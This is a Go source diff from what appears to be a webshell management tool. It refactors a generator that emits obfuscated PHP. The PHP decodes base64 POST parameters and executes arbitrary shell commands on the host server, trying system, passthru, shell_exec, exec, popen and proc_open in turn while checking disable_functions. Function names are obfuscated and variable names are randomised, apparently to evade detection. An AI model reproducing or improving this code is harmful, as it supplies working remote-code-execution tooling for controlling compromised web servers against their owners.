@@ -111,76 +111,47 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 	poR := obfuscatedFuncRefSubstr("popen")
 	prR := obfuscatedFuncRefSubstr("proc_open")
 
-	varP := phpVar6()
-	varS := phpVar6()
-	varEnv := phpVar6()
-	varC := phpVar6()
-	varR := phpVar6()
-	varRet := phpVar6()
-	varO := phpVar6()
-	varDir := phpVar6()
-	varFe := phpVar6()
-	varRuncmd := phpVar6()
-	varEnvArr := phpVar6()
-	varEnvKey := phpVar6()
+	varP, varS := phpVar6(), phpVar6()
+	varEnv, varC := phpVar6(), phpVar6()
+	varR, varRet := phpVar6(), phpVar6()
+	varO, varOArr := phpVar6(), phpVar6()
+	varOPipe, varODes := phpVar6(), phpVar6()
+	varOProc, varOPipes := phpVar6(), phpVar6()
+	varOErr, varORes := phpVar6(), phpVar6()
+	varDir, varFe := phpVar6(), phpVar6()
+	varRuncmd, varEnvArr, varEnvKey := phpVar6(), phpVar6(), phpVar6()
 
-	checks := []funcCheck{
-		{ref: sysR, caller: fmt.Sprintf("@%s($%s,$%s)", sysR, varC, varRet)},
-		{ref: psR, caller: fmt.Sprintf("@%s($%s,$%s)", psR, varC, varRet)},
-		{ref: seR, caller: fmt.Sprintf("print(@%s($%s))", seR, varC)},
-		{ref: exR, caller: fmt.Sprintf("@%s($%s,$%s,$%s);print(join(\"\\n\",$%s))", exR, varC, varO, varRet, varO)},
-		{ref: poR, caller: fmt.Sprintf("$%s=@%s($%s,'r');while(!@feof($%s)){print(@fgets($%s,2048));}@pclose($%s)", phpVar6(), poR, varC, phpVar6(), phpVar6(), phpVar6())},
-		{ref: prR, caller: fmt.Sprintf("$%s=@%s($%s,array(1=>array('pipe','w'),2=>array('redirect',1)),$%s);while(!@feof($%s[1])){print(@fgets($%s[1],2048));}$%s=0;@fclose($%s[1]);@fclose($%s[2]);@proc_close($%s)", phpVar6(), prR, varC, phpVar6(), phpVar6(), phpVar6(), phpVar6(), varRet, phpVar6(), phpVar6())},
-	}
-	shuffleChecks(checks)
-
-	ifElseChain := ""
-	for i, check := range checks {
-		cond := "if"
-		if i > 0 {
-			cond = "elseif"
-		}
-		ifElseChain += cond + "(fe(" + check.ref + ")){" + check.caller + "}"
-	}
-	ifElseChain += "else{$" + varRet + "=127;}"
-
-	noiseComment := ""
-	buf := make([]byte, 1)
-	_, _ = rand.Read(buf)
-	if buf[0]%3 == 0 {
-		noiseComment = "/*" + randomHex(8) + "*/"
-	}
+	refs := []funcCheck{{ref: sysR}, {ref: psR}, {ref: seR}, {ref: exR}, {ref: poR}, {ref: prR}}
 
 	code := "" +
-		b64S + ";" +
-		"$" + varP + "=" + b64R + "(substr($_POST['" + v[0] + "'],0));" +
-		"$" + varS + "=" + b64R + "(substr($_POST['" + v[1] + "'],0));" +
-		"$" + varEnv + "=@" + b64R + "(substr($_POST['" + v[2] + "'],0));" +
+		b64S + ";" + sysR + ";" + psR + ";" + seR + ";" + exR + ";" + poR + ";" + prR + ";" +
+		"$" + varP + "=" + b64R + "((isset($_POST['" + v[0] + "']))?$_POST['" + v[0] + "']:'');" +
+		"$" + varS + "=" + b64R + "((isset($_POST['" + v[1] + "']))?$_POST['" + v[1] + "']:'');" +
+		"$" + varEnv + "=@" + b64R + "((isset($_POST['" + v[2] + "']))?$_POST['" + v[2] + "']:'');" +
 		"$" + varDir + "=dirname($_SERVER['SCRIPT_FILENAME']);" +
 		"$" + varC + "=(substr($" + varDir + ",0,1)=='/')?'-c ' . '\"' . $" + varS + ".'\"' : '/c ' . '\"' . $" + varS + ".'\"';" +
-		"if(substr($" + varDir + ",0,1)=='/'){" +
-		"  @putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');" +
-		"}else{" +
-		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
-		"}" +
+		"if(substr($" + varDir + ",0,1)=='/'){@putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');}" +
+		"else{@putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');}" +
 		"if(!empty($" + varEnv + ")){$" + varEnvArr + "=explode('" + seps.LineSep + "',$" + varEnv + ");foreach($" + varEnvArr + " as $" + varEnvKey + "){if(!empty($" + varEnvKey + ")){@putenv(str_replace('" + seps.KeySep + "','=',$" + varEnvKey + "));}}}" +
 		"$" + varR + "=$" + varP + ".' '.$" + varC + ";" +
-		noiseComment +
-		"function fe($f){$" + varFe + "=explode(',',@ini_get('disable_functions'));" +
-		"if(empty($" + varFe + ")){$" + varFe + "=array();}else{$" + varFe + "=array_map('trim',array_map('strtolower',$" + varFe + "));}" +
-		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$" + varFe + "));}" +
-		"function runcmd($" + varRuncmd + "){global " + buildGlobalList([]funcCheck{{ref: sysR}, {ref: psR}, {ref: seR}, {ref: exR}, {ref: poR}, {ref: prR}}) + ";$" + varRet + "=0;$" + varDir + "=dirname($_SERVER['SCRIPT_FILENAME']);" +
-		ifElseChain +
-		"return $" + varRet + ";}" +
-		"$" + varRet + "=@runcmd($" + varR + ");" +
-		"if($" + varRet + "!=0){echo 'ret=' . $" + varRet + ";}"
+		"function fe($f){$" + varFe + "=explode(',',@ini_get('disable_functions'));if(empty($" + varFe + ")){$" + varFe + "=array();}else{$" + varFe + "=array_map('trim',array_map('strtolower',$" + varFe + "));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$" + varFe + "));}" +
+		"function runcmd($" + varRuncmd + "){global " + buildGlobalList(refs) + ";" +
+		"$" + varO + "='';$" + varRet + "=127;" +
+		"if(fe(" + sysR + ")){ob_start();$" + varRet + "=@" + sysR + "($" + varRuncmd + ");$" + varO + "=ob_get_clean();if($" + varRet + "===false){$" + varRet + "=127;}else{$" + varRet + "=0;}}" +
+		"elseif(fe(" + psR + ")){ob_start();$" + varRet + "=@" + psR + "($" + varRuncmd + ");$" + varO + "=ob_get_clean();if($" + varRet + "===false){$" + varRet + "=127;}else{$" + varRet + "=0;}}" +
+		"elseif(fe(" + seR + ")){$" + varO + "=@" + seR + "($" + varRuncmd + ");$" + varRet + "=($" + varO + "===null)?127:0;}" +
+		"elseif(fe(" + exR + ")){$" + varOArr + "=array();@exec($" + varRuncmd + ",$" + varOArr + ",$" + varRet + ");$" + varO + "=implode(\"\\n\",$" + varOArr + ");}" +
+		"elseif(fe(" + poR + ")){$" + varOPipe + "=@popen($" + varRuncmd + ",'r');if(is_resource($" + varOPipe + ")){$" + varO + "=stream_get_contents($" + varOPipe + ");@pclose($" + varOPipe + ");$" + varRet + "=0;}}" +
+		"elseif(fe(" + prR + ")){$" + varODes + "=array(1=>array('pipe','w'),2=>array('pipe','w'));$" + varOProc + "=@proc_open($" + varRuncmd + ",$" + varODes + ",$" + varOPipes + ");if(is_resource($" + varOProc + ")){$" + varO + "=stream_get_contents($" + varOPipes + "[1]);$" + varOErr + "=stream_get_contents($" + varOPipes + "[2]);@fclose($" + varOPipes + "[1]);@fclose($" + varOPipes + "[2]);$" + varRet + "=proc_close($" + varOProc + ");if($" + varOErr + "!==''){$" + varO + ".=$" + varOErr + ";}}}" +
+		"return array($" + varO + ",$" + varRet + ");}" +
+		"$" + varORes + "=@runcmd($" + varR + ");$" + varO + "=$" + varORes + "[0];$" + varRet + "=$" + varORes + "[1];" +
+		"echo $" + varO + ";if($" + varRet + "!=0){echo \"\\nret=\" . $" + varRet + ";}"
 
 	params := map[string]string{
 		v[0]: placeholderBase64Bin,
 		v[1]: placeholderBase64Cmd,
 		v[2]: placeholderBase64Env,
 	}
-	_ = seps
 	return code, params
 }
 
